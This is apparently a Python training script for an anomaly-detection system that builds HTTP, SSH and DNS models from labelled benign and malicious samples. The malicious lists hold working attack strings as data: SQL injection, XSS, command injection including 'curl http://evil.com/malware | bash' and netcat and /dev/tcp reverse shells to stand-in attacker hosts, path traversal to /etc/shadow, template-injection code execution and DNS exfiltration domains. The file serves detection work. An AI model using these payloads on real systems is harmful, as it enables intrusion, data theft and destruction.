"""
 Model Training Pipeline
Trains three independent Isolation Forest models: HTTP, SSH, DNS.
External datasets are loaded from datasets/ if present; built-in
synthetic samples are used as fallback or supplement.
"""


import os
import glob
import json
from model import MLAnomalyDetector
import config


def save_metrics(protocol, metrics):
    """Safely saves evaluation metrics to a file without crashing the script."""
    metrics_dir = '/content/sentinel/metrics'
    os.makedirs(metrics_dir, exist_ok=True)
    out_path = os.path.join(metrics_dir, f"{protocol.lower()}_metrics.json")
    try:
        with open(out_path, 'w') as f:
            json.dump(metrics if metrics else {"status": "completed"}, f, indent=4)
        print(f"  [OK] Metrics saved to {out_path}")
    except Exception as e:
        print(f"  [WARN] Failed to write metrics: {e}")

        
# ==============================================================================
# HTTP TRAINING DATA
# ==============================================================================

def generate_http_training_data():
    benign = [
        "GET /index.html HTTP/1.1",
        "GET /about.html HTTP/1.1",
        "GET /contact.html HTTP/1.1",
        "GET /products.html HTTP/1.1",
        "GET /blog/2024/article.html HTTP/1.1",
        "GET /images/logo.png HTTP/1.1",
        "GET /css/style.css HTTP/1.1",
        "GET /js/script.js HTTP/1.1",
        "GET /favicon.ico HTTP/1.1",
        "GET /sitemap.xml HTTP/1.1",
        "POST /api/login username=john&password=secret123",
        "POST /api/register email=user@example.com&name=John",
        "POST /api/search query=machine learning tutorials",
        "POST /api/comment content=Great article, thanks!",
        "POST /api/subscribe email=user@example.com",
        "GET /api/users/123",
        "GET /api/products?category=electronics",
        "GET /api/posts?page=1&limit=10",
        "POST /api/orders {productid: 456, quantity: 2}",
        "PUT /api/profile {name: 'John Doe', bio: 'Developer'}",
        "search?q=python programming",
        "search?q=best restaurants near me",
        "search?q=weather forecast",
        "filter?category=books&price_min=10&price_max=50",
        "GET /docs/tutorial.pdf HTTP/1.1",
        "GET /downloads/software.zip HTTP/1.1",
        "POST /feedback message=The site is great!",
        "GET /api/news?date=2024-01-15",
        "GET /profile/user123",
        "POST /api/upload filename=document.pdf",
    ]

    sql_injection = [
        "admin' OR '1'='1'--",
        "' OR 1=1--",
        "admin'--",
        "' OR 'a'='a",
        "1' AND 1=1--",
        "' UNION SELECT NULL--",
        "' UNION SELECT password FROM users--",
        "' UNION SELECT username, password FROM admin--",
        "'; DROP TABLE users--",
        "admin' OR '1'='1'/*",
        "1' AND 'a'='a",
        "' OR ''='",
        "' UNION SELECT @@version--",
        "' UNION SELECT database()--",
        "1' ORDER BY 10--",
        "' UNION ALL SELECT NULL, NULL, NULL--",
        "admin' OR 1=1 LIMIT 1--",
        "' AND 1=0 UNION SELECT NULL, NULL--",
        "' UNION SELECT table_name FROM information_schema.tables--",
        "admin') OR ('1'='1'--",
    ]

    xss_attacks = [
        "<script>alert('XSS')</script>",
        "<script>document.cookie</script>",
        "<img src=x onerror=alert('XSS')>",
        "<iframe src='javascript:alert(1)'></iframe>",
        "javascript:alert('XSS')",
        "<body onload=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "<script>window.location='http://evil.com'</script>",
        "'-alert(1)-'",
        "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycpOw=='))>",
        "<input onfocus=alert(1) autofocus>",
        "<select onfocus=alert(1) autofocus>",
        "<textarea onfocus=alert(1) autofocus>",
        "<marquee onstart=alert(1)>",
        "<details open ontoggle=alert(1)>",
    ]

    command_injection = [
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "&& cat /etc/passwd",
        "; ls -la /root",
        "| whoami",
        "&& id",
        "; wget http://evil.com/malware.sh",
        "| curl http://evil.com/malware | bash",
        "; rm -rf /",
        "&& nc -e /bin/bash evil.com 4444",
        "`cat /etc/shadow`",
        "$(whoami)",
        "; ps aux | grep root",
        "| find / -name '*.key'",
        "&& chmod +x /tmp/backdoor.sh",
    ]

    path_traversal = [
        "../../../../etc/passwd",
        "../../../etc/shadow",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "/etc/passwd",
        "....//....//....//etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "../../../../../../etc/passwd%00.jpg",
        "../../../../../../../windows/win.ini",
        "....//....//....//windows/system32/drivers/etc/hosts",
    ]

    other_attacks = [
        "*)(uid=*))(|(uid=*",
        "admin*",
        "*)(&(objectClass=*",
        "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "http://localhost:8080/admin",
        "http://169.254.169.254/latest/meta-data/",
        "shell.php%00.jpg",
        "backdoor.php.jpg",
    ]

    obfuscated = [
        "%27%20OR%20%271%27%3D%271",
        "%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
        "%2527%2520OR%2520%25271%2527%253D%25271",
        "ad'/**/OR/**/1=1--",
        "SEL/**/ECT * FROM users",
        "SeLeCt * FrOm users",
        "<ScRiPt>alert(1)</sCrIpT>",
        "/etc/passwd%00.jpg",
        "file.php%00.txt",
    ]

    advanced_sqli = [
        "1||(SELECT current_user)",
        "1||(SELECT version())",
        "0||(SELECT sleep(5))",
        "1+(SELECT 1 FROM dual)",
        "1;SELECT pg_sleep(5)",
        "id=1;SELECT pg_sleep(10)",
        "1;WAITFOR DELAY '0:0:5'",
        "1 AND (SELECT COUNT(*) FROM information_schema.tables)>0",
        "1+(SELECT 1 WHERE 1=1)",
        "CASE WHEN (1=1) THEN 1 ELSE 0 END",
        "CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN 1 ELSE 0 END",
        "0x53454c454354202a2046524f4d207573657273",
        "CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)",
    ]

    advanced_xss = [
        "<svg><animate attributeName=x dur=1s repeatCount=indefinite>",
        "<svg><set attributeName=onmouseover to=alert(1)>",
        "<svg><use href=#x onload=alert(1)>",
        "<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>click</a>",
        "<iframe src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",
        "<video><source onerror=alert(1)>",
        "<form><button formaction=javascript&colon;alert(1)>",
        "<object data=javascript:alert(1)>",
        "<math><maction actiontype=statusline xlink:href=javascript:alert(1)>",
        "<style>body{background:url('javascript:alert(1)')}</style>",
    ]

    ssti_attacks = [
        "${7*7}",
        "{{7*7}}",
        "<%= 7*7 %>",
        "${7*'7'}",
        "{{config.items()}}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "#{7*7}",
        "*{7*7}",
        "@{7*7}",
        "{% for x in [].class.base.subclasses() %}{{x}}{% endfor %}",
    ]

    recon_bypass = [
        "printenv",
        "ip addr show",
        "ip route show",
        "pgrep sshd",
        "pgrep apache",
        "ss -tulnp",
        "cat /proc/net/tcp",
        "cat /proc/self/environ",
        "cat /proc/version",
        "lsof -i",
        "env",
        "set",
        "compgen -c",
    ]

    # External dataset loader (optional)
    ext_benign, ext_malicious = _load_external('http')

    malicious = (
        sql_injection + xss_attacks + command_injection +
        path_traversal + other_attacks + obfuscated +
        advanced_sqli + advanced_xss + ssti_attacks + recon_bypass +
        ext_malicious
    )

    benign = benign + ext_benign

    payloads = benign + malicious
    labels   = [0] * len(benign) + [1] * len(malicious)


   
    return payloads, labels


# ==============================================================================
# SSH TRAINING DATA
# ==============================================================================

def generate_ssh_training_data():
    benign = [
        "SSH-2.0-OpenSSH_8.9",
        "SSH-2.0-OpenSSH_9.0",
        "SSH-2.0-OpenSSH_9.3",
        "SSH-2.0-PuTTY_Release_0.78",
        "SSH-2.0-PuTTY_Release_0.79",
        "SSH-2.0-libssh2_1.10.0",
        "SSH-2.0-Bitvise-9.33",
        "SSH-2.0-RebexSSH_5.0",
        "SSH-2.0-JSCH-0.1.55",
        "SSH-2.0-paramiko_3.1.0",
        "curve25519-sha256,ecdh-sha2-nistp256,diffie-hellman-group14-sha256",
        "curve25519-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512",
        "ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256",
        "curve25519-sha256@libssh.org,ecdh-sha2-nistp256",
        "diffie-hellman-group14-sha256,diffie-hellman-group16-sha512",
        "aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com",
        "aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr",
        "chacha20-poly1305@openssh.com,aes256-gcm@openssh.com",
        "aes256-ctr,aes192-ctr,aes128-ctr",
        "aes128-gcm@openssh.com,aes256-gcm@openssh.com",
        "publickey,gssapi-keyex,gssapi-with-mic,password",
        "publickey,password",
        "publickey",
        "keyboard-interactive,password",
        "gssapi-with-mic,publickey,password",
        "deploy@production-server-01",
        "ansible@web-node-03",
        "jenkins@build-server",
        "ubuntu@ip-10-0-1-50",
        "ec2-user@ip-172-31-20-14",
    ]

    brute_force = [
        "root", "admin", "administrator", "pi", "oracle", "postgres",
        "mysql", "guest", "test", "support", "user", "vagrant",
        "ubuntu", "deploy", "ansible",
        "root:root", "admin:admin", "admin:password", "root:toor",
        "admin:123456", "root:password123", "admin:admin123",
        "user:user", "test:test", "guest:guest",
    ]

    downgrade_attacks = [
        "diffie-hellman-group1-sha1",
        "diffie-hellman-group1-sha1,diffie-hellman-group14-sha1",
        "gss-group1-sha1-toWM5Slw5Ew8Mqkay+al2g==",
        "arcfour,arcfour128,arcfour256",
        "arcfour256,arcfour128,arcfour",
        "blowfish-cbc,3des-cbc,arcfour",
        "des-cbc,3des-cbc,blowfish-cbc",
        "rc4,arcfour,blowfish-cbc",
        "arcfour,aes128-ctr,aes256-ctr",
        "blowfish-cbc,chacha20-poly1305@openssh.com",
    ]

    exploit_strings = [
        "libssh 0.6.0 authentication bypass",
        "libssh authentication bypass MSG_USERAUTH_SUCCESS",
        "libssh 0.7.3 server-side state machine",
        "SSH-2.0-OpenSSH_7.2 exploit",
        "SSH-1.99-OpenSSH_3.4 overflow",
        "SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u7",
        "SSH-2.0-" + "A" * 256,
        "SSH-2.0-\x00\x00\x00\x00",
        "SSH-1.0-exploit_probe",
        "SSH-2.0-masscan",
    ]

    shellcode = [
        "\x90\x90\x90\x90\x90\x90\x90\x90shellcode",
        "\x90" * 16 + "\xeb\x0e",
        "\x41" * 32 + "\x90\x90\x90\x90",
        "\x00" * 8 + "overflow",
        "payload\x00\x00\x00\x00\x00",
        "\x00\x00\x00\x00" + "A" * 20,
        "\x31\xc0\x50\x68\x2f\x2f\x73\x68",
        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0",
    ]

    tunneling = [
        "direct-tcpip 127.0.0.1 8080",
        "direct-tcpip localhost 3306",
        "forwarded-tcpip 0.0.0.0 4444",
        "tcpip-forward 0.0.0.0 443",
        "direct-tcpip 10.0.0.1 22",
        "direct-tcpip internal-db.corp 5432",
        "forwarded-tcpip attacker.com 9001",
        "tcpip-forward 0.0.0.0 8443",
        "direct-tcpip 192.168.1.1 80",
        "direct-streamlocal@openssh.com /var/run/docker.sock",
    ]

    reverse_shells = [
        'ssh user@host "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"',
        'ssh user@host "sh -i >& /dev/tcp/10.0.0.1/1337 0>&1"',
        'ssh user@host "exec 5<>/dev/tcp/10.0.0.1/4444;cat <&5|while read l;do $l 2>&5 >&5;done"',
        "bash -i >& /dev/tcp/attacker.com/4444 0>&1",
        "0<&196;exec 196<>/dev/tcp/attacker.com/4444; sh <&196 >&196 2>&196",
    ]

    port_forwarding = [
        "ssh -R 8080:internal-db:5432 attacker@host",
        "ssh -R 443:localhost:443 attacker@host",
        "ssh -L 3306:internal-db.corp:3306 pivot@host",
        "ssh -D 1080 user@host",
        "ssh -N -f -R 9090:127.0.0.1:9090 attacker@host",
        "ssh -w 0:0 root@host",
    ]

    enumeration = [
        "Invalid user guest from 192.168.1.5",
        "Invalid user testuser from 10.0.0.5",
        "Failed password for invalid user deploy from 172.16.0.5",
        "Connection closed by 10.0.0.5 port 52341 [preauth]",
        "Received disconnect from 10.0.0.5: 11: Normal Shutdown [preauth]",
        "Did not receive identification string from 10.0.0.5",
        "Bad protocol version identification from 10.0.0.5",
        "publickey,password,keyboard-interactive,none",
    ]

    malformed_handshake = [
        "SSH-2.0-OpenSSH_8.2p1\xff\x00\xab",
        "SSH-2.0-OpenSSH_7.9\x00\xff\xfe\xfd",
        "SSH-2.0-\xff\xfe\xfd\xfc\xfb\xfa",
        "\xff\x00SSH-2.0-probe",
        "SSH-2.0-" + "\xff" * 32,
        "\x00\x00\x00\x04\xff\xff\xff\xff" + "SSH-2.0-scan",
    ]
##


    ext_benign, ext_malicious = _load_external('ssh')

    # Cowrie direct file — append to ext_malicious
    cowrie_file = '/content/sentinel/datasets/ssh/malicious/cowrie.txt'
    if os.path.exists(cowrie_file):
        try:
            with open(cowrie_file, 'r', errors='replace') as f:
                cowrie_data = [line.strip() for line in f if line.strip()]
            ext_malicious = ext_malicious + cowrie_data[:5000]
            print(f"  -> Injected {len(cowrie_data[:5000])} Cowrie SSH records.")
        except Exception as e:
            print(f"  [WARN] Failed to read cowrie log data: {e}")









    malicious = (
        brute_force + downgrade_attacks + exploit_strings + shellcode +
        tunneling + reverse_shells + port_forwarding + enumeration +
        malformed_handshake + ext_malicious
    )

    benign = benign + ext_benign
    payloads = benign + malicious
    labels = [0] * len(benign) + [1] * len(malicious)

    return payloads, labels


# ==============================================================================
# DNS TRAINING DATA
# ==============================================================================

def generate_dns_training_data():
    benign = [
        "www.google.com", "www.youtube.com", "www.facebook.com",
        "www.amazon.com", "www.wikipedia.org", "www.twitter.com",
        "www.reddit.com", "www.linkedin.com", "www.github.com",
        "www.stackoverflow.com",
        "mail.company.com", "vpn.company.com", "intranet.company.com",
        "api.company.com", "cdn.company.com", "auth.company.com",
        "git.internal.company.com", "monitoring.ops.company.com",
        "s3.amazonaws.com", "ec2.us-east-1.amazonaws.com",
        "storage.googleapis.com", "blob.core.windows.net",
        "login.microsoftonline.com",
        "blog.example.com", "shop.example.com", "support.example.com",
        "news.bbc.co.uk", "docs.python.org", "api.github.com",
    ]

    tunneling = [
        "aGVsbG8gd29ybGQ.tunnel.evil.com",
        "dGhpcyBpcyBhIHRlc3Q.tunnel.evil.com",
        "c3VwZXJzZWNyZXRkYXRh.exfil.attacker.com",
        "cGFzc3dvcmQ6czNjcjN0.data.evil.com",
        "KRQXG33MOVWSYIDMMVWGKIDCMFZWKNZYGI.t.attacker.com",
        "MFRA.OBQXE2LJMQQGC3TBNVSQ.t.attacker.com",
        "orsxg5a.mfra.obqxe2ljmqqgc3tbnvsq.t.evil.com",
        "4865c6c6f20576f726c64.dnscat.evil.com",
        "deadbeefcafebabe0102.cmd.attacker.com",
        "0a1b2c3d4e5f6a7b8c9d.exfil.evil.com",
        "ffffffffffffffffffffffff.data.attacker.com",
        "verylongencodedpayloadthatexceedsanynormaldomain.tunnel.com",
        "aabbccddeeffaabbccddeeffaabbccdd.exfil.evil.com",
        "thisisaverylongsubdomainusedfortunnelingdata1234.attacker.com",
        "encodedchunkofstolendatabeingexfiltratedslowly.c2.evil.com",
    ]

    dga_domains = [
        "xkqvzmnprt.ru", "bnmwqlzxcv.top", "qwrtypsdfg.info",
        "zxcvbnmqwp.biz", "plkjhgfdsa.xyz", "mnbvcxzlkj.club",
        "qzxwsedcrf.online", "vfrtgbnhyj.site",
        "xk3v9zm2prt.ru", "b4nm8ql7xcv.top", "q2rty5sdfg9.info",
        "z1xc3bn5qwp.biz",
        "kqvzmnprtbsdfghjkl.com", "bnmwqlzxcvqwertyui.net",
        "zxcvbnmqwplkjhgfds.org", "plkjhgfdsazxcvbnmq.ru",
    ]

    amplification = [
        "ANY isc.org", "ANY google.com", "ANY cloudflare.com",
        "ANY . ANY", "ANY akamai.com", "ANY ripe.net", "ANY iana.org",
        "ANY verisign.com", "ANY internic.net", "ANY dns.google",
    ]

    txt_exfil = [
        "TXT c3VwZXJzZWNyZXQ.exfil.attacker.com",
        "TXT dXNlcm5hbWU6cGFzc3dvcmQ.data.evil.com",
        "TXT Y3JlZGVudGlhbHM6YWRtaW4.steal.attacker.com",
        "TXT aW50ZXJuYWxkb2N1bWVudA.exfil.evil.com",
        "TXT c3NobGV5OmtleXMK.exfil.attacker.com",
        "NULL encodedpayload.tunnel.evil.com",
        "NULL deadbeef.exfil.attacker.com",
        "NULL aGVsbG8K.data.evil.com",
        "TXT internal-passwords.attacker.com",
        "TXT stolen-keys.evil.com",
        "TXT db-credentials.attacker.com",
    ]

    high_entropy_subdomains = [
        "ajsd98as7d9a8s7d9a8s7d.example.com",
        "q9w8e7r6t5y4u3i2o1p0.example.com",
        "z1x2c3v4b5n6m7q8w9e0.example.com",
        "kdjf93kdj28dkj92kdj2.transfer.example.org",
        "9a8s7d6f5g4h3j2k1l0z.data.corp.com",
        "xp9qm8zv7nb6cw5dl4fk.api.internal.net",
        "r3t4y5u6i7o8p9a0s1d2.srv.company.org",
    ]

    base32_exfil = [
        "MFRGGZDFMZTWQ2LK.data.example.net",
        "JBSWY3DPEB3W64TMMQ.transfer.corp.com",
        "KRQXG33MOVWS4Y3PNVSSA5DPEB3W64TMMQQGK3TF.srv.example.org",
        "ORSXG5A7N5ZGK4RANFXGO3DP.query.internal.net",
        "MFZWKNZYGI3TGMZQ.beacon.example.com",
        "NFXHA5LTORSXG5BRGIZQ.c2.example.net",
    ]

    deep_label_chaining = [
        "a.b.c.d.e.f.g.h.transfer.example.org",
        "chunk1.chunk2.chunk3.chunk4.chunk5.evil.com",
        "aa.bb.cc.dd.ee.ff.data.corp.net",
        "x1.x2.x3.x4.x5.x6.x7.example.com",
        "seg0.seg1.seg2.seg3.seg4.seg5.seg6.attacker.org",
        "part1.part2.part3.part4.part5.part6.internal.net",
    ]

    long_txt_entropy = [
        "v=spf1 include:mail.example.com ~all ajsd89as7d9as7d9",
        "TXT v=DKIM1 k=rsa p=MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQ ajsd98as7d",
        "TXT _dmarc.example.com v=DMARC1 p=reject rua=mailto:dmarc@evil.com z9x8c7v6b5",
        "TXT exfil_chunk_01 aGVsbG8gd29ybGQgdGhpcyBpcyBzdG9sZW4gZGF0YQ",
        "TXT beacon_id_9f8e7d6c5b4a3928 c2_response_ok z1x2c3v4",
    ]


##
    ext_benign, ext_malicious = _load_external('dns')

    # Alexa benign
    alexa_file = '/content/sentinel/datasets/dns/benign/alexa_top500.txt'
    if os.path.exists(alexa_file):
        try:
            with open(alexa_file, 'r') as f:
                alexa_data = [line.strip() for line in f if line.strip()]
            ext_benign = ext_benign + alexa_data
        except Exception as e:
            print(f"  [WARN] Alexa file error: {e}")

    # Bambenek DGA malicious
    bambenek_file = '/content/sentinel/datasets/dns/malicious/bambenek_dga.txt'
    if os.path.exists(bambenek_file):
        try:
            with open(bambenek_file, 'r') as f:
                bambenek_data = [line.strip() for line in f if line.strip()]
            ext_malicious = ext_malicious + bambenek_data[:2000]
        except Exception as e:
            print(f"  [WARN] Bambenek file error: {e}")






    malicious = (
        tunneling + dga_domains + amplification + txt_exfil +
        high_entropy_subdomains + base32_exfil + deep_label_chaining +
        long_txt_entropy + ext_malicious
    )

    benign = benign + ext_benign
    payloads = benign + malicious
    labels = [0] * len(benign) + [1] * len(malicious)

    return payloads, labels


# ==============================================================================
# EXTERNAL DATASET LOADER
# ==============================================================================

def _load_external(protocol):
    """
    Load benign and malicious samples from datasets/<protocol>/.
    Returns (benign_list, malicious_list) — empty lists if not found.

    Expected layout:
        datasets/http/benign/    *.txt or *.csv
        datasets/http/malicious/ *.txt or *.csv
    """
    import csv

    base         = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'datasets', protocol)
    benign_dir   = os.path.join(base, 'benign')
    malicious_dir = os.path.join(base, 'malicious')
    benign, malicious = [], []

    for target_list, target_dir in ((benign, benign_dir), (malicious, malicious_dir)):
        if not os.path.isdir(target_dir):
            continue
        for fname in os.listdir(target_dir):
            fpath = os.path.join(target_dir, fname)
            try:
                if fname.endswith('.txt'):
                    with open(fpath, 'r', errors='replace') as f:
                        for line in f:
                            line = line.strip()
                            if line and not line.startswith('#'):
                                target_list.append(line)
                elif fname.endswith('.csv'):
                    with open(fpath, 'r', errors='replace', newline='') as f:
                        reader = csv.reader(f)
                        for row in reader:
                            if row and not row[0].startswith('#'):
                                target_list.append(row[0].strip())
            except Exception:
                pass

    return benign, malicious


# ==============================================================================
# TRAINING RUNNER
# ==============================================================================


def train_protocol(protocol, payloads, labels):
    print(f"\n{'='*80}\n  TRAINING {protocol} MODEL\n{'='*80}")
    print(f"  Dataset : {len(payloads)} samples | Benign: {labels.count(0)} | Malicious: {labels.count(1)}")

    detector = MLAnomalyDetector(protocol=protocol)
    detector.train(payloads, labels=labels)
    
    # Save files matching expected names in your final cells
    detector.save_model(filename=f"{protocol.lower()}_model.pkl")
    print(f"  [OK] {protocol} model saved successfully.")

    metrics = detector.evaluate(payloads, labels)

    from model import save_metrics as _save_metrics
    _save_metrics(protocol, metrics)
    
    
    return detector





def main():
    print("=" * 80)
    print("  SENTINEL ML ENGINE v2.0 — MULTI-PROTOCOL MODEL TRAINING")
    print("=" * 80)

    # 1. Train HTTP
    http_payloads, http_labels = generate_http_training_data()
    train_protocol("HTTP", http_payloads, http_labels)

    # 2. Train SSH
    ssh_payloads, ssh_labels = generate_ssh_training_data()
    train_protocol("SSH", ssh_payloads, ssh_labels)

    # 3. Train DNS
    dns_payloads, dns_labels = generate_dns_training_data()
    train_protocol("DNS", dns_payloads, dns_labels)

    print(f"\n{'='*80}\n  TRAINING RUN COMPLETED SUCCESSFULLY!\n{'='*80}")

if __name__ == "__main__":
    main()